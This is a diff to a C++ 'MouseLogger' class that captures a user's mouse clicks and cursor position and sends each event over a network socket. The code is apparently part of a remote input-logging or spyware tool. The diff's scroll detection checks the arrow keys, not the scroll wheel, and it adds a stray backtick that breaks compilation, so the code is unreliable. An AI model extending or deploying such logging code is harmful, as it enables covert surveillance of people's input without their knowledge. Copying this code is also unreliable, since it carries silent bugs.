@@ -16,7 +16,7 @@ void MouseLogger::recordMouseClicks(SOCKET sock)
 	{
 		std::string msg = "";
 
-		if (keyPressed(MK_LBUTTON))
+		if (keyPressed(VK_LBUTTON))
 		{
 			msg = "<left-click>";
 		}
@@ -24,8 +24,18 @@ void MouseLogger::recordMouseClicks(SOCKET sock)
 		{
 			msg = "<right-click>";
 		}
-
-		// TODO: check scroll wheel up, scroll wheel down & scroll wheel click
+		else if (keyPressed(VK_MBUTTON))
+		{
+			msg = "<scroll-click>";
+		}
+		else if (keyPressed(VK_UP))
+		{
+			msg = "<scroll-up>";
+		}
+		else if (keyPressed(VK_DOWN))
+		{
+			msg = "<scroll-down>";
+		}
 
 		std::cout << msg;
 		send(sock, msg.c_str(), msg.length(), 0);
@@ -40,7 +50,7 @@ void MouseLogger::recordMousePos(SOCKET sock)
 	POINT currPos;
 	POINT tempPos;
 
-	GetCursorPos(&currPos);
+	GetCursorPos(&currPos);`
 	while (true)
 	{
 		std::string msg = "";
